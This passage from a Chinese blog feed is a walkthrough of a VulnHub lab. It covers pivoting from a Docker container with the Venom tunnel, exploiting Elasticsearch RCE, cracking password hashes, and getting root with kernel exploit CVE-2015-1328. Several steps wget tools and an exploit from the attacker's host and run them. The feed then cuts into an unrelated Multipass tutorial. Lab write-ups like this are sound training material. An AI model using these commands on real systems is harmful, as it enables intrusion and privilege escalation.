src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918104035254.png" alt="image-20210918104035254"></p><h4 id="7-3反弹shell成功连接"><a href="#7-3反弹shell成功连接" class="headerlink" title="7.3反弹shell成功连接"></a>7.3反弹shell成功连接</h4><p>打开kali监听端，可看到已经<strong>成功连接</strong>，并执行<strong>ls</strong>查看当前目录下<strong>文件信息</strong>，<strong>id</strong>查看当前<strong>用户权限</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918104101495.png" alt="image-20210918104101495"></p><h4 id="7-4确认权限环境"><a href="#7-4确认权限环境" class="headerlink" title="7.4确认权限环境"></a>7.4确认权限环境</h4><p>发现了已经拿到了<strong>root用户权限</strong>，但是又看到目录下存在文件Dockerfile（是Docker标准化部署的模板文件），不由得<strong>怀疑当前取得root权限的系统是一个Docker容器的系统</strong>？不如查看一下该文件</p><p>（疑点验证1）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat Dockerfile</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918104242974.png" alt="image-20210918104242974"></p><p>看到文件内容<strong>加深了怀疑</strong>，当前系统是否运行在一个docker环境内</p><p>采用两种方式<strong>判断</strong>是否工作在docker环境：</p><p>判断根目录下.dockerenv 文件</p><p>（疑点验证2）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /.dockerenv</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918104335706.png" alt="image-20210918104335706"></p><p>结果显示存在根目录下的.dockerenv 文件</p><p>查询系统进程的cgroup信息</p><p>（疑点验证3）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918104409653.png" alt="image-20210918104409653"></p><p>结合上面的三次验证结果，可以完全<strong>确认此系统工作在Docker环境内</strong>。</p><p>在此处思考：可以<strong>把Docker容器环境所处的网段看作一个内网环境，那么这个内网环境内是否存在其他存活主机呢？</strong></p><p><strong>若存在其他主机</strong>，就有可能可以得到<strong>更多的信息</strong>，从信息内或许可以<strong>发现漏洞</strong>，进行<strong>利用</strong>，尝试<strong>提权</strong>等。</p><h2 id="二、内网渗透"><a href="#二、内网渗透" class="headerlink" title="二、内网渗透"></a>二、内网渗透</h2><h3 id="1-主机发现-1"><a href="#1-主机发现-1" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p>对内网网段存活主机进行探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(seq 1 5);do ping -c 1 172.17.0.$i;done</span><br></pre></td></tr></table></figure><p>利用for循环定义一个变量i，seq生成一个序列，对网段内每一个IP发1个ping包，<strong>若存活则会返回包</strong>。</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918104947534.png" alt="image-20210918104947534"></p><p>结果显示共有三个回包——<strong>三个存活主机172.17.0.1 ,172.17.0.2 ,172.17.0.3</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918105041952.png" alt="image-20210918105041952"></p><p>查看当前IP为172.17.0.3，<strong>故该网段存活主机为172.17.0.1 172.17.0.2</strong></p><p>思考：获取到两个存活主机地址，自然而然就要扫描两台主机上开放的端口和服务等信息，但由于该IP属于内网网段，Kali攻击<strong>道路不通</strong>，所以现在的当务之急就是将<strong>内网穿透</strong>，即<strong>Kali与172.17.0.1 172.17.0.2互通</strong>。</p><h3 id="2-内网隧道建立"><a href="#2-内网隧道建立" class="headerlink" title="2.内网隧道建立"></a>2.内网隧道建立</h3><h4 id="2-1确认内核信息"><a href="#2-1确认内核信息" class="headerlink" title="2.1确认内核信息"></a>2.1确认内核信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918105132374.png" alt="image-20210918105132374"></p><p>获取到该系统内核信息为：<strong>Linux</strong> 2f55c536515d 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_<strong>64</strong> <strong>Linux</strong></p><h4 id="2-2工具选择（Venom）"><a href="#2-2工具选择（Venom）" class="headerlink" title="2.2工具选择（Venom）"></a>2.2工具选择（Venom）</h4><p>使用工具Venom</p><p>将Venom的对应目标系统的<strong>客户端程序</strong>拷贝到目标系统上（agent）</p><p>再通过攻击机kali上的<strong>服务器端程序</strong>(admin)</p><p>在二者之间<strong>建立一条隧道</strong></p><p>故Venom客户端程序选择为：<strong>admin_linux_x64，agent_linux_x64</strong></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918105515907.png" alt="image-20210918105515907"></p><h4 id="2-3上传工具"><a href="#2-3上传工具" class="headerlink" title="2.3上传工具"></a>2.3上传工具</h4><p>攻击机Kali内Venom v1.1.0文件夹内打开终端窗口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./admin_linux_x64 -lport 9999    #启动服务端程序 并在本地侦听9999端口，等待客户端（目标容器系统）和kali建立反弹连接</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918110456551.png" alt="image-20210918110456551"></p><p>如何将<strong>agent_linux_x64</strong>拷贝到<strong>客户端</strong>（目标容器系统）？</p><p>在<strong>Kali本地的Venom文件夹内打开HTTP服务</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918110518309.png" alt="image-20210918110518309"></p><p>再使用<strong>客户端</strong>（目标容器系统）<strong>访问Kali来下载</strong>agent_linux_x64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.0.2.4/agent_linux_x64</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p>并赋予agent_linux_x64可执行权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x agent_linux_x64</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918110710067.png" alt="image-20210918110710067"></p><p>启动客户端程序，与Kali建立连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./agent_linux_x64 -rhost 10.0.2.4 -rport 9999</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918110830474.png" alt="image-20210918110830474"></p><p>服务器端也接收到了客户端的连接请求</p><h4 id="2-4建立连接"><a href="#2-4建立连接" class="headerlink" title="2.4建立连接"></a>2.4建立连接</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show #显示已连接成功的节点</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goto 1 #连接当前该节点</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918110902587.png" alt="image-20210918110902587"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks 1080</span><br></pre></td></tr></table></figure><p>启动socks监听1080端口，建立一条<strong>代理通道</strong>，让kali能够通过代理去<strong>正常访问</strong>目标容器系统<strong>内网网段</strong>，方便使用kali上的各类工具</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918111109130.png" alt="image-20210918111109130"></p><p>利用proxychains<strong>建立代理</strong></p><p>在Kali端 修改配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/proxychains4.conf </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918111302194.png" alt="image-20210918111302194"></p><p>对应上一步设置的socks5代理和端口，将其修改匹配</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918111415145.png" alt="image-20210918111415145"></p><p><strong>代理通道建立成功</strong>后就可以开始对内网的172.17.0.1和172.17.0.2进行扫描</p><h3 id="3-针对内网主机端口扫描"><a href="#3-针对内网主机端口扫描" class="headerlink" title="3.针对内网主机端口扫描"></a>3.针对内网主机端口扫描</h3><h4 id="3-1针对172-17-0-1扫描"><a href="#3-1针对172-17-0-1扫描" class="headerlink" title="3.1针对172.17.0.1扫描"></a>3.1针对172.17.0.1扫描</h4><p>先对172.17.0.1进行端口扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 172.17.0.1</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918111604295.png" alt="image-20210918111604295"></p><p>进一步扫描端口服务信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -p22,5000 -sV 172.17.0.1</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918111650164.png" alt="image-20210918111650164"></p><p>发现也开放了22和5000端口，<strong>似曾相识</strong>，且服务信息好像也与最开始对靶机10.0.2.5扫描的<strong>结果相同</strong>。</p><p>通过浏览器访问一下172.17.0.1，给浏览器配置代理</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918111815559.png" alt="image-20210918111815559"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问：http://172.17.0.1:5000</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918111845987.png" alt="image-20210918111845987"></p><p>发现页面与之前访问10.0.2.5:5000端口的页面一致，且之前在10.0.2.5<strong>测试的痕迹</strong>也<strong>完全相同</strong>保留在这个页面</p><p>判断说明172.17.0.1是10.0.2.5面向容器内的主机</p><h4 id="3-2针对172-17-0-2扫描"><a href="#3-2针对172-17-0-2扫描" class="headerlink" title="3.2针对172.17.0.2扫描"></a>3.2针对172.17.0.2扫描</h4><p>再对172.17.0.2进行端口扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT  172.17.0.2</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918111955790.png" alt="image-20210918111955790"></p><p>结果为9200端口开放，进一步扫描端口服务信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -p9200 -sV 172.17.0.2</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918112034101.png" alt="image-20210918112034101"></p><p>发现是9200端口上是Elasticsearch服务，且版本是1.4.2</p><h3 id="4-Elasticsearch漏洞利用"><a href="#4-Elasticsearch漏洞利用" class="headerlink" title="4.Elasticsearch漏洞利用"></a>4.Elasticsearch漏洞利用</h3><p>Elasticsearch在历史版本上曾出现过几次验证漏洞，有<strong>RCE远程代码执行漏洞</strong>。</p><p>所以我们尝试在kali上搜索有没有Elasticsearch相关<strong>exp</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Elasticsearch</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918112136386.png" alt="image-20210918112136386"></p><p>发现两个RCE远程代码执行漏洞，我们先尝试第一个。</p><p>将脚本<strong>拷贝</strong>至当前目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/remote/36337.py .</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918112328098.png" alt="image-20210918112328098"></p><p>查看脚本代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi 36337.py</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918112617712.png" alt="image-20210918112617712"></p><p>简单查看该脚本后发现该脚本使用<strong>python2</strong>编写的。（认真看也看不懂-.-）</p><p>执行脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python2 36337.py 172.17.0.2</span><br></pre></td></tr></table></figure><p>注意：这里可能会出现执行失败的可能，只需要插入一条数据后，即可成功执行，若失败可参考链接<a href="http://www.hackdig.com/05/hack-88907.htm">http://www.hackdig.com/05/hack-88907.htm</a></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918113310676.png" alt="image-20210918113310676"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><p>成功<strong>获取</strong>到该容器系统的<strong>root权限</strong></p><h3 id="5-获取root权限后的发现"><a href="#5-获取root权限后的发现" class="headerlink" title="5.获取root权限后的发现"></a>5.获取root权限后的发现</h3><h4 id="5-1发现密码文件"><a href="#5-1发现密码文件" class="headerlink" title="5.1发现密码文件"></a>5.1发现密码文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918113616491.png" alt="image-20210918113616491"></p><p>发现passwords文件，是否可能存在密码？</p><p>查看passwords文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat passwords</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918113740971.png" alt="image-20210918113740971"></p><p>发现的确是<strong>存放账号密码</strong>的文件</p><p>john:3f8184a7343664553fcb5337a3138814<br>test:861f194e9d6118f3d942a72be3e51749<br>admin:670c3bbc209a18dde5446e5e6c1f1d5b<br>root:b3d34352fc26117979deabdf1b9b6354<br>jane:5c158b60ed97c723b673529b8a3cf72b</p><p>但密码被加密，尝试破解</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918114022331.png" alt="image-20210918114022331"></p><p>最终破解得到的<strong>明文密码</strong>如下：</p><p>john:1337hack<br>test:1234test<br>admin:1111pass<br>root:1234pass<br>jane:1234jane</p><h4 id="5-2密码利用"><a href="#5-2密码利用" class="headerlink" title="5.2密码利用"></a>5.2密码利用</h4><p>那么该如何利用这些账号密码呢？寻找开放了22端口的IP地址（10.0.2.5）使用<strong>ssh连接</strong></p><p>最终发现只有john是可以成功登陆利用的账号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh john@10.0.2.5</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918114835254.png" alt="image-20210918114835254"></p><p>成功登陆，查看当前用户权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918114914900.png" alt="image-20210918114914900"></p><p>当前为普通用户</p><h4 id="5-3漏洞发现"><a href="#5-3漏洞发现" class="headerlink" title="5.3漏洞发现"></a>5.3漏洞发现</h4><p>尝试有没有<strong>sudo提权漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br></pre></td></tr></table></figure><p>利用本地提权，结合之前得到的信息该靶机<strong>内核Linux 3.13</strong>，那么这样的老版本是否可能存在<strong>内核漏洞</strong>？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux 3.13</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918115843764.png" alt="image-20210918115843764"></p><p>选取一个exp</p><p>拷贝到本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/37292.c .</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918115933320.png" alt="image-20210918115933320"></p><p>查看文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi 37292.c</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918120006327.png" alt="image-20210918120006327"></p><p>从代码中可以看到，要执行它的话，先要用<strong>gcc编译后</strong>才可执行</p><p>在靶机端<strong>查看是否存在gcc</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918115700764.png" alt="image-20210918115700764"></p><p>没有gcc</p><p>所以是否可以在Kali本机上<strong>先对其进行编译</strong></p><p>分析代码</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918120844859.png" alt="image-20210918120844859"></p><p>定义了变量lib，变量调用system函数来执行系统命令，命令中再次<strong>调用了gcc</strong>，去查找到另外一个C语言库文件ofs-lib.c，把该库文件再<strong>编译成</strong>对应的<strong>ofs-lib.so</strong>文件（二进制共享库文件），<strong>且在整个代码过程中，会加载调用编译后的ofs-lib.so.so文件</strong></p><p>得到：即使在Kali端使用gcc编译该文件，上传到目标靶机上执行时，执行过程仍然会调用gcc编译后的<strong>ofs-lib.so.so</strong>文件，<strong>仍然会报错</strong>。</p><p>解决办法：修改源代码，<strong>删除调用库文件的代码</strong></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918121534221.png" alt="image-20210918121534221"></p><p>最终代码如下：</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918121641513.png" alt="image-20210918121641513"></p><h4 id="5-4漏洞利用"><a href="#5-4漏洞利用" class="headerlink" title="5.4漏洞利用"></a>5.4漏洞利用</h4><p>gcc编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o exp 37292.c</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918121714255.png" alt="image-20210918121714255"></p><p>编译过程中报错，但<strong>不影响最终执行结果</strong></p><p>查看编译生成的exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918121816991.png" alt="image-20210918121816991"></p><p>配合exp执行使用还需要二进制的库文件<strong>ofs-lib.so</strong>，定位查找该文件路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate ofs-lib.so</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918122041377.png" alt="image-20210918122041377"></p><p>拷贝至当前目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so .</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918122314167.png" alt="image-20210918122314167"></p><p>两个文件都在当前目录下</p><p>准备将其一并被下载到目标宿主机上，启动http服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918122427173.png" alt="image-20210918122427173"></p><p>下载文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.0.2.4/exp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.0.2.4/ofs-lib.so</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918122710747.png" alt="image-20210918122710747"></p><p>拷贝到目标靶机的&#x2F;tmp目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv * /tmp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918122819165.png" alt="image-20210918122819165"></p><p>赋予exp执行权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x exp</span><br></pre></td></tr></table></figure><p>执行脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./exp</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918123014190.png" alt="image-20210918123014190"></p><p>成功获取目标root权限</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Name:&lt;/strong&gt; BoredHackerBlog: Social Network&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Date release:&lt;/strong&gt; 29 Mar 2020&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Author&lt;/strong&gt;: &lt;a href=&quot;https://www.vulnhub.com/author/boredhackerblog,683/&quot;&gt;BoredHackerBlog&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Series&lt;/strong&gt;: &lt;a href=&quot;https://www.vulnhub.com/series/boredhackerblog,295/&quot;&gt;BoredHackerBlog&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Download：&lt;/strong&gt;&lt;a href=&quot;https://www.notion.so/01-1369b9060f3143efa7d241a715127a8c&quot;&gt;https://www.vulnhub.com/entry/boredhackerblog-social-network,454/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Leave a message is a new anonymous social networking site where users can post messages for each other. They’ve assigned you to test their set up. They do utilize docker containers. You can conduct attacks against those too. Try to see if you can get root on the host though.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Difficulty:&lt;/strong&gt; Med&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Tasks involved:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;port scanning&lt;/li&gt;
&lt;li&gt;webapp attacks&lt;/li&gt;
&lt;li&gt;code injection&lt;/li&gt;
&lt;li&gt;pivoting&lt;/li&gt;
&lt;li&gt;exploitation&lt;/li&gt;
&lt;li&gt;password cracking&lt;/li&gt;
&lt;li&gt;brute forcing&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Virtual Machine:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Format: Virtual Machine (Virtualbox OVA)&lt;/li&gt;
&lt;li&gt;Operating System: Linux&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Networking:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DHCP Service: Enabled&lt;/li&gt;
&lt;li&gt;IP Address Automatically assign&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This works better with VirtualBox rather than VMware.&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Multipass安装与使用</title>
    <link href="http://example.com/2022/04/12/Multipass/"/>
    <id>http://example.com/2022/04/12/Multipass/</id>
    <published>2022-04-12T07:09:45.172Z</published>
    <updated>2022-04-12T07:10:14.027Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、Multipass介绍"><a href="#一、Multipass介绍" class="headerlink" title="一、Multipass介绍"></a>一、Multipass介绍</h2><p><strong>Multipass</strong> 是您工作站上的迷你云，使用所有受支持平台（Windows、macOS 和 Linux）的本机管理程序，只需单击（“打开 shell”）或简单<code>multipass shell</code>命令，它就会为您提供 Ubuntu 命令行，甚至键盘快捷键。</p><p><strong>Multipass</strong> 是一个轻量虚拟机管理器，是由 <strong>Ubuntu</strong> 运营公司 <strong>Canonical</strong> 所推出的开源项目。运行环境支持 <strong>Linux</strong>、<strong>Windows</strong>、<strong>macOS</strong>。在不同的操作系统上，使用的是不同的虚拟化技术。在 <strong>Linux</strong> 上使用的是 <strong>KVM</strong>、<strong>Window</strong> 上使用 <strong>Hyper-V</strong>、<strong>macOS</strong> 中使用 <strong>HyperKit</strong> 以最小开销运行VM，支持在笔记本模拟小型云。</p><p>同时，<strong>Multipass</strong> 提供了一个命令行界面来启动和管理 <strong>Linux</strong> 实例。下载一个全新的镜像需要几秒钟的时间，并且在几分钟内就可以启动并运行 <strong>VM</strong>。</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220124102540386.png" alt="image-20220124102540386"></p><span id="more"></span><h2 id="二、安装Multipass"><a href="#二、安装Multipass" class="headerlink" title="二、安装Multipass"></a>二、安装Multipass</h2><p>要在 <strong>macOS</strong> 上安装 Multipass，您有两个选择：安装程序包或<a href="https://brew.sh/"><code>brew</code></a></p><h3 id="安装程序包"><a href="#安装程序包" class="headerlink" title="安装程序包"></a>安装程序包</h3><p>下载程序<a href="https://github.com/CanonicalLtd/multipass/releases/">https://github.com/CanonicalLtd/multipass/releases/</a></p><p>卸载脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo sh <span class="string">&quot;/Library/Application Support/com.canonical.multipass/uninstall.sh&quot;</span></span><br></pre></td></tr></table></figure><h3 id="通过brew安装"><a href="#通过brew安装" class="headerlink" title="通过brew安装"></a>通过brew安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install --cask multipass</span><br></pre></td></tr></table></figure><p>卸载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ brew uninstall multipass</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">$ brew uninstall --zap multipass <span class="comment"># to destroy all data, too</span></span><br></pre></td></tr></table></figure><h2 id="三、使用方式"><a href="#三、使用方式" class="headerlink" title="三、使用方式"></a>三、使用方式</h2><h3 id="帮助指南"><a href="#帮助指南" class="headerlink" title="帮助指南"></a>帮助指南</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass <span class="built_in">help</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 